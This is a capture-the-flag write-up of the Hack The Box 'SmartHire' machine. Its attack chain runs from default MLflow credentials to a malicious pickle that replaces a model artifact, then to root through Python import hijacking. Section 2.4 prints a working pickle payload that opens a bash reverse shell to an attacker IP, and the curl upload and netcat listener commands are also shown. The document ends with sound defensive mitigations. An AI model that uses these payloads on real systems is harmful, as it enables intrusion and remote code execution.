# Hack The Box - SmartHire

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Status](https://img.shields.io/badge/Status-Completed-success)

> **Note:** This write-up documents my own methodology and learning process while solving the SmartHire machine. Some commands, values, and screenshots should be adapted to match your own session and environment.

---

## Table of Contents

* [Overview](#overview)
* [Attack Path](#attack-path)
* [Tools Used](#tools-used)
* [1. Reconnaissance](#1-reconnaissance)

  * [1.1 Initial Port Scan](#11-initial-port-scan)
  * [1.2 Web Application Enumeration](#12-web-application-enumeration)
  * [1.3 Virtual Host Discovery](#13-virtual-host-discovery)
  * [1.4 MLflow Discovery](#14-mlflow-discovery)
* [2. Initial Access](#2-initial-access)

  * [2.1 Default Credentials](#21-default-credentials)
  * [2.2 MLflow Model Analysis](#22-mlflow-model-analysis)
  * [2.3 Understanding the Vulnerable Model Loading Process](#23-understanding-the-vulnerable-model-loading-process)
  * [2.4 Creating a Malicious Pickle Payload](#24-creating-a-malicious-pickle-payload)
  * [2.5 Overwriting the Model Artifact](#25-overwriting-the-model-artifact)
  * [2.6 Triggering the Payload](#26-triggering-the-payload)
  * [2.7 Obtaining a Shell](#27-obtaining-a-shell)
* [3. Privilege Escalation](#3-privilege-escalation)

  * [3.1 Sudo Enumeration](#31-sudo-enumeration)
  * [3.2 Analysing the Python Script](#32-analysing-the-python-script)
  * [3.3 Analysing the Plugin Directories](#33-analysing-the-plugin-directories)
  * [3.4 Understanding the Python Import Hijacking](#34-understanding-the-python-import-hijacking)
  * [3.5 Creating the Malicious Module](#35-creating-the-malicious-module)
  * [3.6 Executing the Script as Root](#36-executing-the-script-as-root)
  * [3.7 Obtaining Root Access](#37-obtaining-root-access)
* [4. Attack Chain Summary](#4-attack-chain-summary)
* [5. Key Takeaways](#5-key-takeaways)
* [6. Mitigations](#6-mitigations)

---

# Overview

SmartHire is a medium-difficulty Linux machine focused on vulnerabilities in machine learning infrastructure and insecure Python tooling.

The initial foothold was obtained through an exposed MLflow instance protected by default credentials. After gaining access to the MLflow environment, the model artifact storage and model loading process were analysed. A malicious Python pickle payload was then used to achieve Remote Code Execution when the application loaded the modified model.

After obtaining a shell as the web service user, privilege escalation was performed by analysing a Python script that could be executed with `sudo` privileges. The script dynamically loaded Python modules from plugin directories, one of which was writable by the current user. This allowed Python module hijacking and arbitrary code execution in a root context.

---

# Attack Path

```text
Web Application Enumeration
            ↓
Virtual Host Discovery
            ↓
MLflow Discovery
            ↓
Default Credentials
admin:password
            ↓
MLflow Model Registry
            ↓
Malicious Pickle Artifact
            ↓
Model Deserialization
            ↓
Remote Code Execution
            ↓
Shell as svcweb
            ↓
sudo -l
            ↓
Root-Executable Python Script
            ↓
Writable Plugin Directory
            ↓
Python Module Hijacking
            ↓
Root
```

---

# Tools Used

* Nmap
* ffuf
* Gobuster
* cURL
* Python
* Netcat
* Browser Developer Tools
* MLflow API
* Linux privilege escalation techniques

---

# 1. Reconnaissance

## 1.1 Initial Port Scan

I started by performing a basic Nmap scan against the target:

```bash
nmap  -p- -sC -sV -oN nmap <TARGET_IP>
```

### Results

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http
443/tcp  open  https
```
<img width="952" height="311" alt="01-nmap-smarthire" src="https://github.com/user-attachments/assets/658b67a6-4a20-46cd-907b-b4f9ac9c352a" />

The web services were the primary attack surface, so I proceeded with web enumeration.


---

## 1.2 Web Application Enumeration

Navigating to the main web application revealed a hiring-related platform.

The application allowed users to upload CSV files containing candidate information. The uploaded data was processed by a machine learning model.

A valid CSV file returned a response containing information about the model and its prediction:

```json
{
  "model_info": {
    "version": "1"
  },
  "prediction": [
    70
  ],
  "status": "success"
}
```

The response also revealed information about the underlying model.

At this point, the application appeared to be using an ML model backend, which made ML-related services an interesting area for further enumeration.


---

## 1.3 Virtual Host Discovery

I performed virtual host enumeration against the target:

```bash
ffuf -u http://<TARGET_IP> \
-H "Host: FUZZ.smarthire.htb" \
-w subdomains.txt \
-mc 200,301,302,401,403
```

A valid subdomain was discovered:

```text
models.smarthire.htb
```

I added the host to `/etc/hosts`:

```text
<TARGET_IP> smarthire.htb
<TARGET_IP> models.smarthire.htb
```

Accessing the new virtual host revealed an MLflow instance.

---

## 1.4 MLflow Discovery

The application identified itself as:

```text
MLflow 2.14.1
```

The service was protected by HTTP Basic Authentication.

The response included:

```text
WWW-Authenticate: Basic realm="mlflow"
```

This confirmed that the discovered subdomain was hosting an MLflow model management interface.

---

# 2. Initial Access

## 2.1 Default Credentials

Since the MLflow service was protected by authentication, I tested common default credentials.

The following credentials worked:

```text
Username: admin
Password: password
```

The MLflow interface was now accessible.

<img width="954" height="843" alt="mlflow-interface-smarthire" src="https://github.com/user-attachments/assets/6872f82f-b004-4861-9d22-464316f50e8f" />


The MLflow instance exposed experiments and model information that could be used to understand how the main web application loaded its model.

---

## 2.2 MLflow Model Analysis

Inside the MLflow interface, I identified the model used by the application.

The model was associated with an experiment run and stored artifacts.

The important artifact was the serialized Python model:

```text
python_model.pkl
```

The main application loaded this model when processing uploaded CSV files.

This was important because Python serialization formats such as `pickle` can execute arbitrary code during deserialization when loading untrusted or maliciously modified data.

---

## 2.3 Understanding the Vulnerable Model Loading Process

The attack chain was based on the following process:

```text
CSV Upload
    ↓
Application receives the file
    ↓
Application loads the MLflow model
    ↓
python_model.pkl is deserialized
    ↓
Malicious pickle code executes
```

The key requirement was therefore to modify the stored model artifact.

The MLflow artifact API allowed authenticated users to interact with stored model files.

---

## 2.4 Creating a Malicious Pickle Payload

I created a Python payload that executed a command when the object was deserialized.

Example:

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.155/4444 0>&1'"
        return (os.system, (cmd,))

with open("malicious.pkl", "wb") as f:
    f.write(pickle.dumps(Exploit()))

print("Done! malicious.pkl created")
```

The payload was then generated:

```bash
python3 exploit.py
```

This produced:

```text
malicious.pkl
```

---

## 2.5 Overwriting the Model Artifact

The authenticated MLflow artifact API was used to upload the malicious file and overwrite the existing model artifact.

The request followed this general structure:

```bash
curl -u admin:password -X PUT \
  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/6a857dff5209433a8db970239f6ffbfd/artifacts/model/python_model.pkl" \
  --data-binary @./malicious.pkl \
  -H "Content-Type: application/octet-stream"
```

The server accepted the uploaded artifact.

At this point, the legitimate serialized model had been replaced with the malicious payload.

---

## 2.6 Triggering the Payload

I started a listener on my attacking machine:

```bash
nc -lvnp 4444
```

The model loading process was then triggered by submitting a CSV file to the main application.

Example:

```bash
curl -X POST http://smarthire.htb/predict \
-b "session=<YOUR_SESSION_COOKIE>" \
-F "file=@test.csv"
```

When the application attempted to load the modified model, the malicious pickle was deserialized.

This caused the payload to execute on the target machine.

---

## 2.7 Obtaining a Shell

The reverse shell successfully connected back to my attacking machine.


I received a shell as:

```text
svcweb
```

I verified the current user:

```bash
whoami
```

```text
svcweb
```

At this point, the initial access phase was complete.

<img width="956" height="148" alt="initial-compromise-smarthire" src="https://github.com/user-attachments/assets/f8e36560-5de2-42c1-8c37-0dfd2b132abe" />

---

# 3. Privilege Escalation

## 3.1 Sudo Enumeration

I started the privilege escalation phase by checking the commands available through `sudo`:

```bash
sudo -l
```

The output revealed that the current user could execute a Python script as root:

```text
(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

This immediately made the script a high-priority target for analysis.

---

## 3.2 Analysing the Python Script

The script dynamically loaded Python modules from a plugin directory.

The important logic was similar to:

```python
from pathlib import Path
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

The script then imported modules by name:

```python
import mlflow_actions
import backup_models
```

This was dangerous because the modules were not imported using an absolute trusted path.

Instead, the script modified Python's module search path before importing them.

The important question was therefore:

> Can the current user modify any directory that is searched for these modules?

---

## 3.3 Analysing the Plugin Directories

I inspected the permissions of the plugin directories:

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
```

One of the directories was writable by a group that the current user belonged to.

I checked my group memberships:

```bash
id
```

The current user belonged to the group that had write access to the development plugin directory.

This meant I could potentially place attacker-controlled Python files in a location that would later be searched by a script executed as root.

---

## 3.4 Understanding the Python Import Hijacking

The script used:

```python
site.addsitedir()
```

This function adds a directory to Python's module search path.

The important detail is that Python can also process `.pth` files located inside site directories.

A `.pth` file can contain import statements that execute during Python startup/path processing.

This creates a potential chain:

```text
Writable Plugin Directory
        ↓
Create malicious .pth file
        ↓
Modify sys.path
        ↓
Place malicious Python module
        ↓
Root script imports module
        ↓
Attacker-controlled code executes as root
```

---

## 3.5 Creating the Malicious Module

I created a malicious module with the same name as one of the modules imported by the root-executable script.

For example:

```text
mlflow_actions.py
```

The module contained code that executed immediately when imported.

The important point is that the code executed during import, before the script completed its normal functionality.

Therefore, the malicious module did not necessarily need to fully replicate the original module.

---

## 3.6 Executing the Script as Root

The vulnerable script was then executed through the allowed `sudo` command:

```bash
sudo /usr/bin/python3.10 \
/opt/tools/mlflow_ctl/mlflowctl.py status
```

During execution:

```text
Python starts
    ↓
Plugin directories are added to sys.path
    ↓
Malicious path manipulation is processed
    ↓
Attacker-controlled module is imported
    ↓
Payload executes as root
```

Even if the script later produced an error because the malicious module did not implement all the functions expected by the application, the import-time payload had already executed.

---

## 3.7 Obtaining Root Access

After the payload executed, I verified the resulting privileges:

```bash
whoami
```

```text
root
```

The machine was successfully compromised.

<img width="497" height="114" alt="root-smarthire" src="https://github.com/user-attachments/assets/bf2a691d-0565-42d2-8458-97af4bc1bdd2" />

---

# 4. Attack Chain Summary

| Phase                | Technique                        | Result                                   |
| -------------------- | -------------------------------- | ---------------------------------------- |
| Reconnaissance       | Web application enumeration      | Main application discovered              |
| Enumeration          | Virtual host discovery           | MLflow subdomain discovered              |
| Credential Access    | Default credentials              | MLflow admin access                      |
| Model Analysis       | MLflow model registry            | Serialized model artifact identified     |
| Initial Access       | Malicious pickle deserialization | Remote Code Execution                    |
| Foothold             | Reverse shell                    | Shell as `svcweb`                        |
| Privilege Escalation | `sudo -l`                        | Root-executable Python script discovered |
| File Permissions     | Writable plugin directory        | Python import path controlled            |
| Module Hijacking     | Malicious Python module          | Root-level code execution                |
| Final Access         | Privilege escalation             | Root obtained                            |

---

# 5. Key Takeaways

### 1. Machine Learning Infrastructure Is Part of the Attack Surface

MLflow and other ML platforms should be treated as production infrastructure, not merely development tools.

Model registries often contain executable or deserializable artifacts that can become dangerous if an attacker gains write access.

---

### 2. Default Credentials Can Completely Compromise Internal Services

The MLflow instance was protected by authentication, but the credentials were still:

```text
admin:password
```

Authentication alone is not enough if credentials are weak or left unchanged.

---

### 3. Python Deserialization Can Lead to Remote Code Execution

Python serialization formats such as `pickle` are not safe for untrusted data.

If an attacker can modify a serialized object and the application later deserializes it, arbitrary code execution may be possible.

---

### 4. Writable Python Search Paths Are Dangerous

A root-executed Python script should never add user-writable directories to its import path.

Otherwise, an attacker may be able to replace or hijack modules imported by the privileged process.

---

### 5. Import-Time Code Execution Does Not Require a Fully Functional Module

A malicious module can execute code as soon as it is imported.

The privileged script may fail afterward, but the attacker's code may already have executed successfully.

---

# 6. Mitigations

## MLflow Security

* Replace all default credentials.
* Use strong, unique passwords.
* Restrict access to the MLflow interface.
* Implement proper authentication and authorization.
* Separate model read and write permissions.
* Protect artifact storage from unauthorized modification.

## Unsafe Deserialization

* Avoid deserializing untrusted pickle files.
* Validate and verify model artifacts.
* Use safer serialization formats where possible.
* Apply integrity checks and cryptographic signatures to model artifacts.

## Python Privilege Escalation Prevention

* Never run Python scripts as root when unnecessary.
* Never add user-writable directories to the Python module search path.
* Avoid dynamic imports from untrusted locations.
* Ensure plugin directories are owned and writable only by trusted administrators.
* Review all `sudo` rules involving scripting languages.

---

# Final Thoughts

SmartHire was a particularly interesting machine because the initial access and privilege escalation relied on two different concepts.

The initial compromise involved understanding the relationship between:

```text
MLflow
    ↓
Model Artifacts
    ↓
Python Deserialization
    ↓
Remote Code Execution
```

The privilege escalation required analysing:

```text
sudo
    ↓
Python Script
    ↓
Dynamic Plugin Loading
    ↓
Writable Import Path
    ↓
Module Hijacking
    ↓
Root
```

The most valuable lesson from this machine was the importance of understanding the underlying mechanism behind a vulnerability instead of relying only on a pre-built exploit.

Once the application architecture and Python import behaviour were understood, both the initial access and privilege escalation paths became much easier to reason about.
